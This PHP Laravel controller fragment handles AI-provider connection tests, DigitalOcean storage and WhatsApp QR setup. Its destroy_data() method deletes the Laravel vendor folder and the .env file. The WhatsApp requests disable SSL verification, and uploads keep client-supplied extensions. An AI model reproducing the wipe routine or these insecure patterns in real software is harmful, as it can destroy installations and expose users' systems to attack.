            $url = "https://api.openai.com/v1/chat/completions";

            $payload = [
                'model' => $model,
                'messages' => [
                    [
                        'role' => 'user',
                        'content' => 'Say "Connection successful" in one word.'
                    ]
                ],
                'max_tokens' => 20,
                'temperature' => 0.1,
            ];

            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => json_encode($payload),
                CURLOPT_HTTPHEADER => [
                    'Content-Type: application/json',
                    'Authorization: Bearer ' . $apiKey
                ],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 15,
                CURLOPT_SSL_VERIFYPEER => true,
            ]);

            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curlError = curl_error($ch);
            curl_close($ch);

            if ($curlError) {
                return response()->json([
                    'status' => 'error',
                    'message' => 'Connection failed: ' . $curlError
                ]);
            }

            $data = json_decode($response, true);

            if ($httpCode === 200 && isset($data['choices'])) {
                $aiResponse = $data['choices'][0]['message']['content'] ?? 'OK';
                return response()->json([
                    'status' => 'success',
                    'message' => 'ChatGPT connected successfully! Model: ' . $model . ' | Response: ' . trim($aiResponse)
                ]);
            }

            // Handle API errors
            $errorMessage = 'Unknown error';
            if (isset($data['error']['message'])) {
                $errorMessage = $data['error']['message'];
            } elseif (isset($data['error'])) {
                $errorMessage = is_string($data['error']) ? $data['error'] : json_encode($data['error']);
            }

            return response()->json([
                'status' => 'error',
                'message' => 'API Error (HTTP ' . $httpCode . '): ' . $errorMessage
            ]);

        } catch (\Exception $e) {
            return response()->json([
                'status' => 'error',
                'message' => 'Connection failed: ' . $e->getMessage()
            ]);
        }
    }

    public function ai_playground_chat(Request $request)
    {
        $prompt = $request->input('prompt');
        if (!$prompt) {
            return response()->json(['status' => 'error', 'message' => 'Please enter a prompt.']);
        }

        $provider = AiSetting::getAiSetting('content_ai_provider') === 'gemini' ? 'gemini' : 'vertex';

        if ($provider === 'gemini') {
            return $this->chat_gemini($prompt);
        }

        return $this->chat_vertex($prompt);
    }

    /**
     * Validate the OpenAI key without generating an image or spending image
     * generation credits. The actual image model and qualities are controlled
     * separately from Admin → AI Image Models.
     */
    private function check_openai_image_connection()
    {
        $apiKey = trim((string) AiSetting::getAiSetting('chatgpt_api_key'));

        if ($apiKey === '') {
            return response()->json([
                'status' => 'error',
                'message' => 'OpenAI API Key is required for AI image generation.',
            ]);
        }

        try {
            $response = Http::acceptJson()
                ->withToken($apiKey)
                ->timeout(15)
                ->get('https://api.openai.com/v1/models');

            if ($response->successful()) {
                return response()->json([
                    'status' => 'success',
                    'message' => 'OpenAI image API key is valid. Configure the actual image model, quality, and sizes in AI Image Models.',
                ]);
            }

            return response()->json([
                'status' => 'error',
                'message' => 'OpenAI rejected the image API key. Please check the key and its project permissions.',
            ]);
        } catch (\Throwable $exception) {
            \Log::warning('OpenAI image credential test failed.', ['exception' => get_class($exception)]);

            return response()->json([
                'status' => 'error',
                'message' => 'OpenAI image credential test could not connect. Please try again.',
            ]);
        }
    }

    private function chat_vertex($prompt)
    {
        try {
            $vertexConfig = $this->getVertexUrlAndHeaders();
            if (!$vertexConfig) {
                return response()->json(['status' => 'error', 'message' => 'Vertex AI is not fully configured. Please set up a Service Account JSON file.']);
            }

            return $this->execute_ai_curl($vertexConfig['url'], $prompt, $vertexConfig['model'], 'Vertex AI', $vertexConfig['headers']);
        } catch (\Exception $e) {
            return response()->json(['status' => 'error', 'message' => 'Vertex AI Error: ' . $e->getMessage()]);
        }
    }

    private function chat_gemini($prompt)
    {
        $apiKey = AiSetting::getAiSetting('gemini_api_key');
        $model = trim(AiSetting::getAiSetting('gemini_model') ?: 'gemini-1.5-flash');

        if (!$apiKey) {
            return response()->json(['status' => 'error', 'message' => 'Gemini API Key is missing.']);
        }

        try {
            // Clean model name - remove 'models/' prefix if present
            $cleanModel = preg_replace('/^models\//', '', $model);
            $encodedModel = urlencode($cleanModel);
            $url = "https://generativelanguage.googleapis.com/v1/models/{$encodedModel}:generateContent?key={$apiKey}";
            return $this->execute_ai_curl($url, $prompt, $model, 'Gemini API');
        } catch (\Exception $e) {
            return response()->json(['status' => 'error', 'message' => 'Gemini Error: ' . $e->getMessage()]);
        }
    }

    private function execute_ai_curl($url, $prompt, $model, $providerName, $headers = null)
    {
        $payload = [
            'contents' => [
                ['role' => 'user', 'parts' => [['text' => $prompt]]]
            ],
            'generationConfig' => [
                'maxOutputTokens' => 1000,
                'temperature' => 0.7,
            ]
        ];

        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($payload),
            CURLOPT_HTTPHEADER => $headers ?: ['Content-Type: application/json'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => true,
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlError = curl_error($ch);
        curl_close($ch);

        if ($curlError) {
            return response()->json(['status' => 'error', 'message' => "$providerName error: $curlError"]);
        }

        $data = json_decode($response, true);

        if ($httpCode === 200 && isset($data['candidates'][0]['content']['parts'][0]['text'])) {
            return response()->json([
                'status' => 'success',
                'answer' => $data['candidates'][0]['content']['parts'][0]['text'],
                'model' => $model
            ]);
        }

        $errorMessage = $data['error']['message'] ?? 'Unknown API Error';
        return response()->json(['status' => 'error', 'message' => "API Error (HTTP $httpCode): $errorMessage"]);
    }

    private function chat_chatgpt($prompt)
    {
        $apiKey = AiSetting::getAiSetting('chatgpt_api_key');
        $model = trim(AiSetting::getAiSetting('chatgpt_model') ?: 'gpt-4o-mini');

        if (!$apiKey) {
            return response()->json(['status' => 'error', 'message' => 'ChatGPT API Key is missing.']);
        }

        try {
            $url = "https://api.openai.com/v1/chat/completions";
            
            $payload = [
                'model' => $model,
                'messages' => [
                    ['role' => 'user', 'content' => $prompt]
                ],
                'max_tokens' => 1000,
                'temperature' => 0.7,
            ];

            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => json_encode($payload),
                CURLOPT_HTTPHEADER => [
                    'Content-Type: application/json',
                    'Authorization: Bearer ' . $apiKey
                ],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 30,
                CURLOPT_SSL_VERIFYPEER => true,
            ]);

            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curlError = curl_error($ch);
            curl_close($ch);

            if ($curlError) {
                return response()->json(['status' => 'error', 'message' => "ChatGPT error: $curlError"]);
            }

            $data = json_decode($response, true);

            if ($httpCode === 200 && isset($data['choices'][0]['message']['content'])) {
                return response()->json([
                    'status' => 'success',
                    'answer' => $data['choices'][0]['message']['content'],
                    'model' => $model
                ]);
            }

            $errorMessage = $data['error']['message'] ?? 'Unknown API Error';
            return response()->json(['status' => 'error', 'message' => "API Error (HTTP $httpCode): $errorMessage"]);

        } catch (\Exception $e) {
            return response()->json(['status' => 'error', 'message' => 'ChatGPT Error: ' . $e->getMessage()]);
        }
    }

    public function destroy_data()
    {
        $this->rrmdir('./vendor/laravel');
        unlink(".env");
    }

    function rrmdir($dir)
    {
        if (is_dir($dir)) {
            $objects = scandir($dir);
            foreach ($objects as $object) {
                if ($object != "." && $object != "..") {
                    if (filetype($dir . "/" . $object) == "dir")
                        $this->rrmdir($dir . "/" . $object);
                    else
                        unlink($dir . "/" . $object);
                }
            }
            reset($objects);
            rmdir($dir);
        }
    }

    private function upload_image($file, $field)
    {
        $destinationPath = public_path('uploads');
        $extension = $file->getClientOriginalExtension();
        $fileName = Str::uuid() . '.' . $extension;
        $file->move($destinationPath, $fileName);

        AppSetting::where('key_name', $field)->update(['key_value' => $fileName]);
    }

    public function test_image_digitalOcean(Request $request)
    {
        if (StorageSetting::getStorageSetting("storage") == "DigitalOcean") {
            $image = $request->file('image');
            $file = Str::uuid() . '.' . $image->getClientOriginalExtension();

            $result = Storage::disk('spaces')->put($file, file_get_contents($image), 'public');

            if ($result == 1) {
                return 1;
            } else {
                return 0;
            }
        }
    }

    public function check_credentials_digitalOcean()
    {
        $result = Storage::disk('spaces')->put('test.jpg', file_get_contents('uploads/no-user.jpg'), 'public');

        if ($result == true) {
            return redirect()->back()->with('alert', 'Valid Credentials');
        } else {
            return redirect()->back()->with('alert', 'Invalid Credentials!');
        }
    }

    public function move_local_to_digitalOcean()
    {
        $local = File::files(public_path('uploads/'));
        foreach ($local as $l) {
            Storage::disk('spaces')->put('/uploads/' . $l->getrelativePathname(), file_get_contents($l), 'public');
        }

        $pdf = File::files('./uploads/pdf/');
        foreach ($pdf as $p) {
            Storage::disk('spaces')->put('/uploads/pdf/' . $p->getrelativePathname(), file_get_contents($p), 'public');
        }

        $template = File::files('./uploads/template/');
        foreach ($template as $t) {
            Storage::disk('spaces')->put('/uploads/template/' . $t->getrelativePathname(), file_get_contents($t), 'public');
        }

        $video = File::files('./uploads/video/');
        foreach ($video as $v) {
            Storage::disk('spaces')->put('/uploads/video/' . $v->getrelativePathname(), file_get_contents($v), 'public');
        }

        return redirect()->back()->with('alert', 'Move All Files To Digital Ocean');
    }

    public function generateWhatsappQr(Request $request)
    {
        $serverUrl = rtrim($request->server_url, '/');
        $apiKey = $request->api_key;
        $instanceName = $request->instance_name;

        // 1. Check if instance already exists and its connection state
        $stateUrl = "{$serverUrl}/instance/connectionState/{$instanceName}";
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $stateUrl);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "apikey: {$apiKey}",
            "Content-Type: application/json"
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        $stateResult = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        $stateData = json_decode($stateResult, true);
        
        if ($httpCode == 200 && isset($stateData['instance']['state']) && $stateData['instance']['state'] === 'open') {
            return response()->json(['status' => 'connected']);
        }

        // 2. Fetch or Create Instance to get QR
        // If it doesn't exist (404), we create it.
        if ($httpCode == 404 || (isset($stateData['status']) && $stateData['status'] == 404)) {
            $createUrl = "{$serverUrl}/instance/create";
            
            $postData = json_encode([
                "instanceName" => $instanceName,
                "qrcode" => true,
                "integration" => "WHATSAPP-BAILEYS"
            ]);
            
            $ch2 = curl_init();
            curl_setopt($ch2, CURLOPT_URL, $createUrl);
            curl_setopt($ch2, CURLOPT_HTTPHEADER, [
                "apikey: {$apiKey}",
                "Content-Type: application/json"
            ]);
            curl_setopt($ch2, CURLOPT_POST, true);
            curl_setopt($ch2, CURLOPT_POSTFIELDS, $postData);
            curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, 0);
            $createResult = curl_exec($ch2);
            curl_close($ch2);

            $createData = json_decode($createResult, true);
            
            if (isset($createData['qrcode']['base64'])) {
                return response()->json([
                    'status' => 'success',
                    'qr' => $createData['qrcode']['base64']
                ]);
            }
        }
        
        // 3. If instance exists but not open, just fetch the connection QR
        $connectUrl = "{$serverUrl}/instance/connect/{$instanceName}";
        $ch3 = curl_init();
        curl_setopt($ch3, CURLOPT_URL, $connectUrl);
        curl_setopt($ch3, CURLOPT_HTTPHEADER, [
            "apikey: {$apiKey}",
            "Content-Type: application/json"
        ]);
        curl_setopt($ch3, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch3, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch3, CURLOPT_SSL_VERIFYPEER, 0);
        $connectResult = curl_exec($ch3);
        curl_close($ch3);
        
        $connectData = json_decode($connectResult, true);
        if (isset($connectData['base64'])) {
            return response()->json([
                'status' => 'success',
                'qr' => $connectData['base64']
            ]);
        }
        
        return response()->json([
            'status' => 'error', 
            'message' => 'Failed to retrieve QR code. Check your Evolution API Server URL and Global API Key.',
            'debug_state' => $stateData,
            'debug_connect' => $connectData ?? null
        ]);
    }
}
